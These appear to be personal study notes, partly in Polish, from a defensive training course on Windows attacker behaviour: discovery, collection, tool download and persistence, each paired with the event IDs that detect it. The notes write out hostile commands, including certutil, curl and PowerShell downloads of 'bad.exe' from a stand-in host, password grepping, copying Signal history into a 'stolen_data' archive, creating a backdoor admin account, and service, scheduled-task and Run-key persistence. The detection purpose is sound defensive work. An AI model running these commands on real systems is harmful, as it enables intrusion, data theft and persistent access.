
### Discovery commands

| Discovery Purpose                                                                                    | Common CMD / PowerShell Commands                                                          |
| ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Files and Folders**  <br>(To find out the host purpose, victim's job, or their interests)          | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`             |
| **Users and Groups**  <br>(To find out who uses the host and with which privileges)                  | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`                     |
| **System and Apps**  <br>(To find out vulnerabilities or apps to steal data from)                    | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`               |
| **Network Settings**  <br>(To find out if the host belongs to a corporate network)                   | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`                     |
| **Active Antivirus**  <br>(To find out how risky it is to continue the attack without being blocked) | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |
### Detecting collection

| Command Example                                                        | Description                                                                     |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`                | Threat actors used Notepad to check content of the interesting file             |
| CMD: `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Threat actors searched for the "password" keyword in a specific file            |
| PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`     | Threat actors searched for PDF files in the user's home folder                  |
| PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\`     | Threat actors copied Signal chat history to the Temp directory                  |
| PowerShell: `Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip`        | Threat actors archived the stolen data, preparing for exfiltration              |
| `7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*`                | Alternatively, threat actors can use the existing archiving software like 7-Zip |

### Popularny malware po wstępnym dostępie do systemu

- A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
- A tool to extract saved passwords or OS credentials like [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- A fully functional Remote Access Trojan (RAT) like [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/)

Ta technika dogrywania malware w MITRE jest nazywana [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)


### Common transfer methods

| Ingress Tool Transfer Command                                                                                            | Common CMD / PowerShell Commands                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------- |
| Via Certutil                                                                                                             | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`                           |
| Via Curl (Windows 10+)                                                                                                   | `curl.exe https://blackhat.thm/bad.exe -o good.exe`                                         |
| Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Via Graphical Interface                                                                                                  | No need to use CMD, just copy-paste malware via RDP or download them via a web browser!     |

### Tworzenie usera z adminem

1. Graficznie przez Computer Management lub przez `lusrmgr.msc` 
2. cmd lub ps:

```powershell
# 1. Two methods to create the "mr.backd00r" user
CMD C:\> net user "mr.backd00r" "p@ssw0rd!" /add
PS  C:\> New-LocalUser "mr.backd00r" -Password [...]

# 2. Two methods to add the user to Administrators 
CMD C:\> net localgroup Administrators "mr.backd00r" /add
PS  C:\> Add-LocalGroupMember "Administrators" -Member "mr.backd00r"
```

Wykrywanie to sprawdzenie eventID 4720. Dodanie usera do grupy to 4732 a reset hasła to 4724.

### Persistence methods

Jest ich generalnie setki ale te dwa to najczęstsze:

|Persistence Method|Attack Example|Event ID Logging|
|---|---|---|
|Create a Windows Service  <br>(Runs after OS startup)|`sc create "BadService" binpath= "C:\malware.exe" start= auto`|**Launch of sc.exe:** Sysmon / **1**  <br>**Service creation:** Security / **4697  <br>**|
|Create a Scheduled Task  <br>(Run after OS startup)|`schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System`|**Launch of schtasks.exe:** Sysmon / **1**  <br>**Scheduled task creation:** Security / **4698**|

Żeby zobaczyć usługi trzeba wejść w `services.msc`, wykonanie **sc.exe** wymaga praw admina (edycja i tworzenie usług). Metody wykrycia:

1. Detect the launch of the `sc.exe create` command via Sysmon event ID **1**
2. Detect service creation via Security event ID **4697** or System event ID [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html)
3. Detect suspicious processes with a `services.exe` parent process


### Per user persistance

Odpalenie malware dla danego usera

|Persistence Method|Attack Example|Event ID Logging|
|---|---|---|
|Add malware to Startup Folder  <br>(Runs upon user login)|`copy C:\malware.exe   "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"`|**New startup item:** Sysmon Event ID **11**|
|Add malware to "Run" keys  <br>(Runs upon user login)|`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"   /v BadKey /t REG_SZ /d "C:\malware.exe"`|**New registry value:** Sysmon Event ID **13**|

Dla pierwszego przypadku to wystarczy wejść w startup:

```plaintext
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
Or for all users: 
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Dla drugiego rejestry:

```plaintext
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Or for all users: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

Żeby zobaczyć te rejestry run to w `regedit.exe` a w sysmon EventID 13

Dla obu parent process to będzie C:\Windows\explorer.exe